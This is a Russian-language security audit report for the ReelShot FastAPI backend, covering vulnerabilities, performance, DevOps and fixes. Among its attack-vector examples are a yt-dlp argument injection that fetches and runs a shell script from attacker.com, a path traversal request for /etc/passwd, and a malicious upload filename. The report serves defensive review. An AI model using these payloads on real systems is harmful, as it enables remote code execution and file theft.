# Комплексный аудит проекта ReelShot Backend

> **Репозиторий:** `funactuator/reel_shot` (FastAPI Backend для Instagram Reels Screenshot)  
> **Дата аудита:** 2026-04-07  
> **Версия:** 1.0

---

## 📋 Executive Summary

Проект **ReelShot Backend** представляет собой FastAPI-приложение для извлечения кадров из видео с использованием алгоритмов SSIM и Pixel Difference. Кодовая база состоит из ~250 строк Python кода.

### 🚨 Ключевые выводы

| Категория | Critical | High | Medium | Low | Итого |
|-----------|:--------:|:----:|:------:|:---:|:-----:|
| **Архитектура** | 7 | 5 | 0 | 1 | 13 |
| **Безопасность** | 4 | 5 | 3 | 2 | 14 |
| **Производительность** | 3 | 8 | 8 | 2 | 21 |
| **DevOps** | 3 | 4 | 2 | 0 | 9 |
| **ИТОГО** | **17** | **22** | **13** | **5** | **57** |

### ⚠️ Критические блокеры (Showstoppers)

Проект **НЕ ГОТОВ к продакшену** по следующим причинам:

1. **Command Injection** - возможность выполнения произвольных команд через `yt-dlp`
2. **Path Traversal** - доступ к файлам за пределами storage директории
3. **Arbitrary File Write** - запись файлов в произвольные локации
4. **Блокирующие операции** - полная остановка сервера при обработке видео
5. **Отсутствие контейнеризации** - нет Docker конфигурации

---

## 🔴 Критические блокеры (Showstoppers)

### 1. Command Injection [CRITICAL]

**Файл:** `main.py:226-232`

```python
command = [
    "yt-dlp",
    "-f", "mp4",
    "--output", video_path,
    reel_url  # ← Прямая передача без валидации!
]
subprocess.run(command, check=True)
```

**Вектор атаки:**
```bash
reel_url = "--exec 'curl http://attacker.com/shell.sh | sh'"
```

**Решение:**
```python
import re
from urllib.parse import urlparse

def validate_reel_url(url: str) -> bool:
    """Валидация URL Instagram reels."""
    pattern = r'^https?://(www\.)?(instagram\.com|fb\.watch)/reel/[^/]+/?$'
    return bool(re.match(pattern, url))

# Использовать список аргументов вместо строки
command = [
    "yt-dlp",
    "-f", "mp4",
    "--output", video_path,
    "--",  # Разделитель для предотвращения инъекций
    reel_url
]
```

---

### 2. Path Traversal [CRITICAL]

**Файл:** `main.py:106-115`

```python
@app.get("/get-frame/{unique_id}/{frame_name}")
async def get_frame(unique_id: str, frame_name: str):
    frame_path = os.path.join(STORAGE_FOLDER, unique_id, frame_name)
    # frame_name = "../../../etc/passwd" → чтение системных файлов!
```

**Вектор атаки:**
```bash
GET /get-frame/any/../../../etc/passwd/frame.png
```

**Решение:**
```python
import re
from pathlib import Path

UUID_PATTERN = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$')
FILENAME_PATTERN = re.compile(r'^frame_\d+\.png$')

@app.get("/get-frame/{unique_id}/{frame_name}")
async def get_frame(unique_id: str, frame_name: str):
    # Валидация формата UUID
    if not UUID_PATTERN.match(unique_id):
        raise HTTPException(status_code=400, detail="Invalid unique_id format")
    
    # Валидация имени файла
    if not FILENAME_PATTERN.match(frame_name):
        raise HTTPException(status_code=400, detail="Invalid frame_name format")
    
    # Безопасное построение пути
    frame_path = Path(STORAGE_FOLDER) / unique_id / frame_name
    
    # Проверка что путь находится внутри STORAGE_FOLDER
    try:
        frame_path.relative_to(Path(STORAGE_FOLDER).resolve())
    except ValueError:
        raise HTTPException(status_code=403, detail="Access denied")
    
    if not frame_path.exists():
        raise HTTPException(status_code=404, detail="Frame not found")
    
    return StreamingResponse(open(frame_path, "rb"), media_type="image/png")
```

---

### 3. Arbitrary File Write [CRITICAL]

**Файл:** `main.py:72-75`

```python
video_path = f"temp_{video_file.filename}"  # ← Нет валидации имени файла!
with open(video_path, "wb") as buffer:
    buffer.write(video_file.file.read())
```

**Вектор атаки:**
```bash
filename = "../../../tmp/malicious.sh"
```

**Решение:**
```python
import uuid
from pathlib import Path

ALLOWED_EXTENSIONS = {'.mp4', '.avi', '.mov', '.mkv'}
MAX_FILE_SIZE = 500 * 1024 * 1024  # 500MB

@app.post("/extract-frames")
async def extract_frames_api(
    video_file: UploadFile = File(...),
    method: str = Form("ssim"),
    threshold: float = Form(0.8),
):
    # Проверка размера файла
    file_size = 0
    contents = await video_file.read()
    file_size = len(contents)
    
    if file_size > MAX_FILE_SIZE:
        raise HTTPException(status_code=413, detail="File too large")
    
    # Генерация безопасного имени файла
    file_ext = Path(video_file.filename).suffix.lower()
    if file_ext not in ALLOWED_EXTENSIONS:
        raise HTTPException(status_code=400, detail="Invalid file type")
    
    unique_id = str(uuid.uuid4())
    video_path = f"temp_{unique_id}{file_ext}"
    
    try:
        with open(video_path, "wb") as buffer:
            buffer.write(contents)
        # ... остальная логика
    finally:
        # Гарантированная очистка
        if os.path.exists(video_path):
            os.remove(video_path)
```

---

### 4. Блокирующие операции в асинхронном коде [CRITICAL]

**Файл:** `main.py:47-104`, `utils/video_utils.py:11-44`

```python
@app.post("/extract-frames")
async def extract_frames_api(...):
    # Блокирующие операции:
    with open(video_path, "wb") as buffer:  # ← Блокирует event loop
        buffer.write(video_file.file.read())
    
    frames = extract_frames(video_path, method, threshold, frame_dir)  # ← CV2 блокирует
```

**Решение:**
```python
import asyncio
from concurrent.futures import ThreadPoolExecutor
import aiofiles

# Пул потоков для CPU-bound операций
executor = ThreadPoolExecutor(max_workers=4)

@app.post("/extract-frames")
async def extract_frames_api(...):
    unique_id = str(uuid.uuid4())
    video_path = f"temp_{unique_id}.mp4"
    
    try:
        # Асинхронная запись файла
        async with aiofiles.open(video_path, "wb") as buffer:
            content = await video_file.read()
            await buffer.write(content)
        
        # Запуск CPU-bound операции в пуле потоков
        frame_dir = os.path.join(STORAGE_FOLDER, unique_id)
        os.makedirs(frame_dir, exist_ok=True)
        
        loop = asyncio.get_event_loop()
        frames = await loop.run_in_executor(
            executor,
            extract_frames,
            video_path, method, threshold, frame_dir
        )
        
    finally:
        if os.path.exists(video_path):
            os.remove(video_path)
```

---

### 5. Отсутствие контейнеризации [CRITICAL]

**Проблема:** Проект невозможно задеплоить без Docker конфигурации.

**Решение:**

```dockerfile
# Dockerfile
FROM python:3.11-slim as builder

WORKDIR /app

# Установка системных зависимостей
RUN apt-get update && apt-get install -y --no-install-recommends \
    libgl1-mesa-glx \
    libglib2.0-0 \
    ffmpeg \
    && rm -rf /var/lib/apt/lists/*

# Копирование requirements
COPY requirements.txt .
RUN pip install --no-cache-dir --user -r requirements.txt

# Финальный образ
FROM python:3.11-slim

WORKDIR /app

# Копирование зависимостей
COPY --from=builder /root/.local /root/.local

# Копирование кода
COPY . .

# Переменные окружения
ENV PATH=/root/.local/bin:$PATH
ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1

# Создание директории для хранения
RUN mkdir -p /app/storage

EXPOSE 8000

# Health check
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
    CMD curl -f http://localhost:8000/health || exit 1

CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
```

---

## 📊 Детальный аудит по категориям

### 1. Архитектура и интеграции

#### Поток данных

```
Клиент → FastAPI → Валидация → Сохранение видео → Извлечение кадров → Хранение → Ответ
                ↓
         Background Task (очистка)
```

#### Найденные проблемы

| # | Проблема | Критичность | Описание |
|---|----------|:-----------:|----------|
| 1 | Race Condition в хранилище задач | 🔴 Critical | `background_tasks_storage` без блокировок |
| 2 | time.sleep() блокирует event loop | 🔴 Critical | Все запросы зависают на время задержки |
| 3 | Дублирование кода | 🟡 High | `/extract-frames` и `/extract-frames-url` идентичны |
| 4 | Нет health check | 🟡 High | Невозможно мониторить состояние |
| 5 | Нет graceful shutdown | 🟡 High | Background tasks прерываются |
| 6 | TOCTOU в get_frame | 🟡 High | Проверка `os.path.exists()` неатомарна |
| 7 | Нет очистки при ошибках | 🟡 High | Временные файлы не удаляются |

#### Рекомендации по архитектуре

```python
# 1. Использовать asyncio.Lock для хранилища
from asyncio import Lock

tasks_lock = Lock()

async def update_task_status(unique_id: str, status: str):
    async with tasks_lock:
        background_tasks_storage[unique_id]["status"] = status

# 2. Заменить time.sleep() на asyncio.sleep()
async def delete_frames_after_delay(unique_id: str, delay_minutes: int):
    await asyncio.sleep(delay_minutes * 60)
    # ... очистка

# 3. Добавить health check
@app.get("/health")
async def health_check():
    return {"status": "healthy", "timestamp": datetime.now().isoformat()}
```

---

### 2. Безопасность

#### Найденные уязвимости

| # | Уязвимость | Критичность | CVSS | Описание |
|---|------------|:-----------:|:----:|----------|
| 1 | Command Injection | 🔴 Critical | 9.8 | Прямая передача URL в subprocess |
| 2 | Path Traversal | 🔴 Critical | 8.6 | Нет валидации путей |
| 3 | Arbitrary File Write | 🔴 Critical | 8.1 | Нет валидации имени файла |
| 4 | Unrestricted File Upload | 🔴 Critical | 7.5 | Нет ограничения размера |
| 5 | Insecure CORS | 🟠 High | 6.5 | `allow_methods=["*"]` с credentials |
| 6 | Information Disclosure | 🟠 High | 5.3 | Раскрытие внутренних путей |
| 7 | No Rate Limiting | 🟠 High | 5.3 | Возможны DoS атаки |
| 8 | Missing Authentication | 🟠 High | 5.3 | Все эндпоинты открыты |

#### Безопасная конфигурация CORS

```python
from fastapi.middleware.cors import CORSMiddleware

# Разрешенные origins
ALLOWED_ORIGINS = [
    "http://localhost:5173",
    "https://yourdomain.com",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["GET", "POST"],  # Только необходимые методы
    allow_headers=["Content-Type", "Authorization"],  # Только необходимые заголовки
    max_age=600,  # Кэширование preflight запросов
)
```

#### Rate Limiting

```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@app.post("/extract-frames")
@limiter.limit("5/minute")  # Максимум 5 запросов в минуту
async def extract_frames_api(...):
    ...
```

---

### 3. Производительность

#### Найденные проблемы

| # | Проблема | Критичность | Влияние |
|---|----------|:-----------:|---------|
| 1 | Блокирующие операции | 🔴 Critical | Сервер недоступен при загрузке |
| 2 | Утечка памяти (хранение кадров) | 🔴 Critical | ~500MB RAM на минуту видео |
| 3 | Блокирующий subprocess | 🔴 Critical | Скачивание блокирует event loop |
| 4 | Утечка памяти (tasks_storage) | 🟠 High | Не очищается |
| 5 | Блокирующий sleep | 🟠 High | Блокирует рабочий поток |
| 6 | Двойное кодирование кадров | 🟠 High | Двойная нагрузка на CPU |
| 7 | Нет таймаутов | 🟠 High | Процессы могут зависнуть |

#### Оптимизированный video_utils.py

```python
import cv2
import numpy as np
from skimage.metrics import structural_similarity as ssim
import os

def extract_frames(video_path: str, method: str, threshold: float, frame_dir: str) -> list:
    """Извлечение кадров с оптимизацией памяти."""
    cap = cv2.VideoCapture(video_path)
    if not cap.isOpened():
        raise ValueError(f"Cannot open video: {video_path}")
    
    frame_names = []
    prev_frame = None
    frame_count = 0
    saved_count = 0
    
    # Пропускаем каждый 2-й кадр для оптимизации
    SKIP_FRAMES = 2
    
    try:
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            
            # Пропуск кадров
            if frame_count % SKIP_FRAMES != 0:
                frame_count += 1
                continue
            
            # Уменьшение разрешения для сравнения
            small_frame = cv2.resize(frame, (320, 240))
            gray_frame = cv2.cvtColor(small_frame, cv2.COLOR_BGR2GRAY)
            
            if prev_frame is not None:
                should_save = False
                
                if method == 'ssim':
                    score, _ = ssim(prev_frame, gray_frame, full=True)
                    should_save = score < threshold
                elif method == 'pixel':
                    diff = cv2.absdiff(prev_frame, gray_frame)
                    diff_percent = (np.count_nonzero(diff) / diff.size)
                    should_save = diff_percent > threshold
                
                if should_save:
                    frame_name = f'frame_{saved_count:04d}.png'
                    frame_path = os.path.join(frame_dir, frame_name)
                    # Сохраняем оригинальный кадр, а не уменьшенный
                    cv2.imwrite(frame_path, frame)
                    frame_names.append(frame_name)
                    saved_count += 1
            
            prev_frame = gray_frame
            frame_count += 1
    finally:
        cap.release()
    
    return frame_names  # Возвращаем только имена, не сами кадры
```

---

### 4. DevOps и инфраструктура

#### Найденные проблемы

| # | Проблема | Критичность | Описание |
|---|----------|:-----------:|----------|
| 1 | Отсутствует Dockerfile | 🔴 Critical | Нет контейнеризации |
| 2 | Нет закрепленных версий | 🔴 Critical | Все 7 зависимостей без версий |
| 3 | Отсутствуют CI/CD пайплайны | 🔴 Critical | Нет автоматизации |
| 4 | Нет docker-compose.yml | 🟠 High | Нет конфигурации для разработки |
| 5 | Нет Nginx конфигурации | 🟠 High | Нет обратного прокси |
| 6 | Нет скриптов деплоя | 🟠 High | Ручной деплой |

#### Исправленный requirements.txt

```
fastapi==0.104.1
uvicorn[standard]==0.24.0
opencv-python==4.8.1.78
numpy==1.26.2
scikit-image==0.22.0
python-multipart==0.0.6
yt-dlp==2023.11.16
aiofiles==23.2.1
slowapi==0.1.9
pydantic-settings==2.1.0
python-jose[cryptography]==3.3.0
passlib[bcrypt]==1.7.4
```

#### Docker Compose конфигурация

```yaml
# docker-compose.yml
version: '3.8'

services:
  app:
    build: .
    ports:
      - "8000:8000"
    environment:
      - STORAGE_FOLDER=/app/storage
      - DELETE_DELAY_MINS=30
      - FRONTEND_URL=http://localhost:5173
    volumes:
      - ./storage:/app/storage
    restart: unless-stopped
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8000/health"]
      interval: 30s
      timeout: 10s
      retries: 3

  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
      - ./ssl:/etc/nginx/ssl
    depends_on:
      - app
    restart: unless-stopped
```

#### GitHub Actions CI/CD

```yaml
# .github/workflows/ci-cd.yml
name: CI/CD Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'
      
      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          pip install pytest pytest-asyncio httpx
      
      - name: Run tests
        run: pytest tests/ -v
      
      - name: Security scan
        run: |
          pip install bandit safety
          bandit -r . -f json -o bandit-report.json || true
          safety check

  build:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Build Docker image
        run: docker build -t reelshot:${{ github.sha }} .
      
      - name: Scan image for vulnerabilities
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: reelshot:${{ github.sha }}
          format: 'sarif'
          output: 'trivy-results.sarif'

  deploy:
    needs: build
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    steps:
      - name: Deploy to production
        run: |
          echo "${{ secrets.SSH_KEY }}" > deploy_key
          chmod 600 deploy_key
          ssh -i deploy_key ${{ secrets.SSH_USER }}@${{ secrets.SSH_HOST }} \
            'cd /opt/reelshot && docker-compose pull && docker-compose up -d'
```

---

## 🛠️ План исправления

### Phase 1: Критические исправления (1-2 дня)

- [ ] Исправить Command Injection
- [ ] Исправить Path Traversal
- [ ] Исправить Arbitrary File Write
- [ ] Добавить валидацию файлов
- [ ] Добавить rate limiting
- [ ] Создать Dockerfile

### Phase 2: Производительность (2-3 дня)

- [ ] Вынести блокирующие операции в thread pool
- [ ] Оптимизировать использование памяти
- [ ] Добавить таймауты
- [ ] Реализовать потокобезопасное хранилище

### Phase 3: Инфраструктура (1-2 дня)

- [ ] Закрепить версии зависимостей
- [ ] Создать docker-compose.yml
- [ ] Настроить Nginx
- [ ] Создать CI/CD пайплайн
- [ ] Добавить health checks

### Phase 4: Безопасность (1 день)

- [ ] Настроить CORS правильно
- [ ] Добавить security headers
- [ ] Реализовать аутентификацию (опционально)
- [ ] Настроить логирование

---

## 📈 Метрики и мониторинг

### Рекомендуемые метрики

```python
from prometheus_client import Counter, Histogram, generate_latest

# Метрики
upload_counter = Counter('video_uploads_total', 'Total video uploads')
processing_time = Histogram('video_processing_seconds', 'Video processing time')
frame_extraction_counter = Counter('frames_extracted_total', 'Total frames extracted')

@app.get("/metrics")
async def metrics():
    return Response(generate_latest(), media_type="text/plain")
```

### Логирование

```python
import logging
from pythonjsonlogger import jsonlogger

# Настройка JSON логирования
logHandler = logging.StreamHandler()
formatter = jsonlogger.JsonFormatter(
    '%(timestamp)s %(level)s %(name)s %(message)s'
)
logHandler.setFormatter(formatter)

logger = logging.getLogger("reelshot")
logger.addHandler(logHandler)
logger.setLevel(logging.INFO)

# Использование
logger.info("Video processing started", extra={
    "unique_id": unique_id,
    "filename": video_file.filename,
    "method": method
})
```

---

## 📚 Дополнительные рекомендации

### 1. Тестирование

```python
# tests/test_main.py
import pytest
from fastapi.testclient import TestClient
from main import app

client = TestClient(app)

def test_health_check():
    response = client.get("/health")
    assert response.status_code == 200
    assert response.json()["status"] == "healthy"

def test_path_traversal_protection():
    response = client.get("/get-frame/../../../etc/passwd/test.png")
    assert response.status_code in [400, 403]

def test_file_size_limit():
    large_file = b"x" * (501 * 1024 * 1024)  # 501MB
    response = client.post(
        "/extract-frames",
        files={"video_file": ("test.mp4", large_file, "video/mp4")}
    )
    assert response.status_code == 413
```

### 2. Документация API

```python
from fastapi import FastAPI
from pydantic import BaseModel

class FrameExtractionResponse(BaseModel):
    unique_id: str
    frames: dict[str, str]
    
    class Config:
        schema_extra = {
            "example": {
                "unique_id": "550e8400-e29b-41d4-a716-446655440000",
                "frames": {
                    "frame_0.png": "/get-frame/550e8400-e29b-41d4-a716-446655440000/frame_0.png"
                }
            }
        }

@app.post(
    "/extract-frames",
    response_model=FrameExtractionResponse,
    summary="Extract frames from uploaded video",
    description="Upload a video file and extract unique frames using SSIM or pixel difference method.",
    response_description="Returns unique ID and URLs for extracted frames"
)
async def extract_frames_api(...):
    ...
```

---

## ✅ Чеклист перед продакшеном

### Безопасность
- [ ] Все CRITICAL уязвимости исправлены
- [ ] Rate limiting настроен
- [ ] CORS правильно сконфигурирован
- [ ] Все пользовательские входы валидируются
- [ ] Security headers добавлены

### Производительность
- [ ] Блокирующие операции вынесены в thread pool
- [ ] Утечки памяти устранены
- [ ] Таймауты настроены
- [ ] Лимиты размера файла установлены

### Инфраструктура
- [ ] Dockerfile создан и протестирован
- [ ] Docker Compose настроен
- [ ] CI/CD пайплайн работает
- [ ] Nginx настроен с SSL
- [ ] Health checks добавлены
- [ ] Мониторинг настроен

### Тестирование
- [ ] Unit tests покрывают >80% кода
- [ ] Integration tests проходят
- [ ] Security scan чист
- [ ] Load testing проведен

---

## 📞 Заключение

Проект **ReelShot Backend** имеет значительный потенциал, но требует серьезных доработок перед использованием в продакшене. Основные проблемы сосредоточены в областях безопасности и производительности.

### Приоритеты исправления:

1. **🔴 Немедленно:** Command Injection, Path Traversal, Arbitrary File Write
2. **🟠 Высокий:** Блокирующие операции, Docker, Rate Limiting
3. **🟡 Средний:** CI/CD, Nginx, Мониторинг
4. **🟢 Низкий:** Документация, Тесты

### Оценка готовности к продакшену: **15%**

Проект требует минимум **5-7 дней работы** для достижения минимально приемлемого уровня безопасности и стабильности.

---

*Отчет сгенерирован автоматически на основе комплексного аудита.*
